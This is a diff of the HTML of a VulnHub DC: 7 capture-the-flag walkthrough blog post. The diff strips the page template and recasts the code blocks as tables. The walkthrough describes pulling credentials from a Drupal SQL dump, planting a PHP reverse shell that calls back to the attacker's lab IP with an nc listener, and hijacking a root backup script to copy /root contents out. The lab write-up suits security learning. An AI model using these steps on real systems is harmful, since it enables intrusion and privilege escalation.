@@ -1,51 +1,4 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Entry 0x06 - VulnHub: DC: 7 Walkthrough</title>
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"  media="screen,projection"/>
-    <link rel="stylesheet" href="/assets/css/styles.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  </head>
-
-  <body class="">
-    <nav>
-  <div class="nav-wrapper black"><ul id="nav-mobile" class="left">
-      
-        <li ><a href="/">Home</a></li>
-      
-        <li ><a href="/about.html">About</a></li>
-      
-        <li ><a href="/blog.html">Blog</a></li>
-      
-    </ul>
-    <ul id="nav-mobile" class="right">
-      <li><a href="https://youtube.com"><i class="material-icons">library_music</i></a></li>
-    </ul>
-  </div>
-</nav>
-    <div class="">
-    <style>
-    header{
-        background: url('/assets/images/screen-shot-2019-09-02-at-10.52.52-pm-1.png');
-        background-size: cover;
-        background-position: center;
-        min-height: 430px;
-    }
-    @media screen and (max-width: 670px){
-        header{
-        min-height: 200px;
-        }
-    }
-</style>
-<header>
-</header>
-<div class="white">
-    <div class="row container flow-text">
-        <h3 class="header">Entry 0x06 - VulnHub: DC: 7 Walkthrough</h3>
-        <h6>Posted on <b>03 September 2019</b></h6>
-        <br/>
-        <p class="grey-text text-darken-3 lighten-3"><p><strong>DC: 7</strong> is a challenge posted on <a href="https://www.vulnhub.com/entry/dc-7,356/">VulnHub</a> created by <a href="https://www.vulnhub.com/author/dcau,610/">DCAU</a>. This is a write-up of my experience solving this awesome CTF challenge.</p>
+I"/f<p><strong>DC: 7</strong> is a challenge posted on <a href="https://www.vulnhub.com/entry/dc-7,356/">VulnHub</a> created by <a href="https://www.vulnhub.com/author/dcau,610/">DCAU</a>. This is a write-up of my experience solving this awesome CTF challenge.</p>
 
 <p>With my Attack Machine (<strong>Kali Linux</strong>) and Victim Machine (<strong>DC: 7</strong>) set up and running, I decided to get down to solving this challenge.</p>
 
@@ -164,14 +117,14 @@
 
 <p>Jackpot! We can clearly see what’s happening here. The script flows as follows:</p>
 
-<ol>
+<ul>
   <li>Delete contents of the <code class="language-plaintext highlighter-rouge">/home/dc7user/backups</code> directory</li>
   <li>Use <code class="language-plaintext highlighter-rouge">drush</code> (<a href="https://www.digitalocean.com/community/tutorials/a-beginner-s-guide-to-drush-the-drupal-shell">Drupal shell</a>) to create an <code class="language-plaintext highlighter-rouge">SQL</code> dump of the Drupal database</li>
   <li>Create a compressed copy of all the website files</li>
   <li>Encrypt both files using <code class="language-plaintext highlighter-rouge">GPG</code> with the passphrase <code class="language-plaintext highlighter-rouge">PickYourOwnPassword</code></li>
   <li>Sets the owner of contents inside <code class="language-plaintext highlighter-rouge">/home/dc7user/backups</code> as <code class="language-plaintext highlighter-rouge">dc7user:dc7user</code> which means both user and group access is limited to <code class="language-plaintext highlighter-rouge">dc7user</code></li>
   <li>Deletes the files</li>
-</ol>
+</ul>
 
 <p>Now, I was ecstatic because I knew how to own this box. This technique is well known in the world of CTF - You modify the script, add in lines to output the contents of <code class="language-plaintext highlighter-rouge">flag.txt</code> to a readable file and let it run in its own glory as root.</p>
 
@@ -219,29 +172,47 @@
 
 <p>Now, my solution is neither the cleanest nor most efficient… but I wanted the credentials and this worked.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 30 "Table structure for table `users`"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 30 "Table structure for table \\\`users\\\`"
 </code></pre></div></div>
 
 <p><img src="/assets/images/screen-shot-2019-09-03-at-7.20.39-pm.png" alt="Screen Shot 2019-09-03 at 7.20.39 PM.png" /></p>
 
 <p>The optional argument <code class="language-plaintext highlighter-rouge">-A</code> refers to lines <em>after</em> the matched line. We can conclude that the <code class="language-plaintext highlighter-rouge">users</code> table does not contain credentials. Moving on to <code class="language-plaintext highlighter-rouge">users_data</code> using the command:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 30 "Table structure for table `users_data`"
-</code></pre></div></div>
+<table>
+  <tbody>
+    <tr>
+      <td>cat website.sql</td>
+      <td>grep -A 30 “Table structure for table \`users_data\`”</td>
+    </tr>
+  </tbody>
+</table>
 
 <p><img src="/assets/images/screen-shot-2019-09-03-at-7.22.43-pm.png" alt="Screen Shot 2019-09-03 at 7.22.43 PM.png" /></p>
 
 <p>Nope, nothing. Moving on to the final table <code class="language-plaintext highlighter-rouge">users_field_data</code> using the command:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 30 "Table structure for table `users_field_data`"
-</code></pre></div></div>
+<table>
+  <tbody>
+    <tr>
+      <td>cat website.sql</td>
+      <td>grep -A 30 “Table structure for table \`users_field_data\`”</td>
+    </tr>
+  </tbody>
+</table>
 
 <p><img src="/assets/images/screen-shot-2019-09-03-at-7.24.29-pm.png" alt="Screen Shot 2019-09-03 at 7.24.29 PM.png" /></p>
 
 <p>Woohoo! The table <code class="language-plaintext highlighter-rouge">users_field_data</code> contains <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">pass</code>, <code class="language-plaintext highlighter-rouge">mail</code> and other user-specific fields. Let’s expand the <code class="language-plaintext highlighter-rouge">grep</code> and view some data!</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat website.sql | grep -A 40 "Table structure for table `users_field_data`"
-</code></pre></div></div>
+<table>
+  <tbody>
+    <tr>
+      <td>cat website.sql</td>
+      <td>grep -A 40 “Table structure for table \`users_field_data\`”</td>
+    </tr>
+  </tbody>
+</table>
 
 <p><img src="/assets/images/screen-shot-2019-09-03-at-7.27.24-pm.png" alt="Screen Shot 2019-09-03 at 7.27.24 PM.png" /></p>
 
@@ -326,19 +297,21 @@
 
 <p>Important steps to follow:</p>
 
-<ol>
+<ul>
   <li>Select the <strong>Text format</strong> as <code class="language-plaintext highlighter-rouge">PHP code</code></li>
   <li>Copy the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> code to the <strong>Body</strong>. On Kali Linux, it can be found in <code class="language-plaintext highlighter-rouge">/usr/share/laudanum/php/php-reverse-shell.php</code></li>
-  <li>
-    <p>Edit the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> code and modify the following lines:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     - $ip = '192.168.56.102'; // Attack machine IP
-            
-     - $port = 8888; // Desired port
-</code></pre></div>    </div>
+  <li>Edit the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> code and modify the following lines:
+    <ul>
+      <li>
+        <p>$ip = ‘192.168.56.102’; // Attack machine IP</p>
+      </li>
+      <li>
+        <p>$port = 8888; // Desired port</p>
+      </li>
+    </ul>
   </li>
   <li>Open a shell and run <code class="language-plaintext highlighter-rouge">nc -lvp 8888</code> on attack machine to listen for a reverse shell</li>
-</ol>
+</ul>
 
 <p>Once these steps are completed. Click on the <strong>Preview</strong> button and watch the magic unfold!</p>
 
@@ -348,9 +321,8 @@
 
 <p>Okay… back to the game plan. We simply need to modify <code class="language-plaintext highlighter-rouge">/opt/scripts/backups.sh</code> with the following lines of code:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
-cat /root/\* &gt; /tmp/arj/flag.txt
-</code></pre></div></div>
+<p>#!/bin/bash
+cat /root/* &gt; /tmp/arj/flag.txt</p>
 
 <p><img src="/assets/images/screen-shot-2019-09-04-at-12.53.32-am.png" alt="Screen Shot 2019-09-04 at 12.53.32 AM.png" /></p>
 
@@ -371,39 +343,4 @@ cat /root/\* &gt; /tmp/arj/flag.txt
 <p>As always, I cannot wait for the next one in the <a href="https://www.vulnhub.com/series/dc,199/">DC series</a>!</p>
 
 <p>If you enjoyed reading this, please check out my <a href="/2019/05/29/vulnhub-dc-6-walkthrough">DC: 6 walkthrough</a> and <a href="/2019/06/03/vulnhub-dc-3-walkthrough">DC: 3 walkthrough</a> which are challenges by @DCAU in the <a href="https://www.vulnhub.com/series/dc,199/">DC series</a>.</p>
-</p>
-    </div>
-    <div class="row container">
-        
-        <div onclick="window.location='/tags.html#beginner'" class="chip waves-effect waves-block waves-light">Beginner</div>
-        
-        <div onclick="window.location='/tags.html#ctf'" class="chip waves-effect waves-block waves-light">CTF</div>
-        
-        <div onclick="window.location='/tags.html#kali'" class="chip waves-effect waves-block waves-light">Kali</div>
-        
-        <div onclick="window.location='/tags.html#linux'" class="chip waves-effect waves-block waves-light">Linux</div>
-        
-        <div onclick="window.location='/tags.html#vulnhub'" class="chip waves-effect waves-block waves-light">Vulnhub</div>
-        
-        <div onclick="window.location='/tags.html#walkthrough'" class="chip waves-effect waves-block waves-light">Walkthrough</div>
-        
-        <div onclick="window.location='/tags.html#writeup'" class="chip waves-effect waves-block waves-light">Writeup</div>
-        
-        <div onclick="window.location='/tags.html#security'" class="chip waves-effect waves-block waves-light">Security</div>
-        
-        <div onclick="window.location='/tags.html#dc-series'" class="chip waves-effect waves-block waves-light">DC-Series</div>
-        
-    </div>
-</div>
-
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-    var elems = document.querySelectorAll('.materialboxed');
-    var instances = M.Materialbox.init(elems);
-    });
-</script>
-</html>
-    </div>
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
-  </body>
-</html>
+:ET
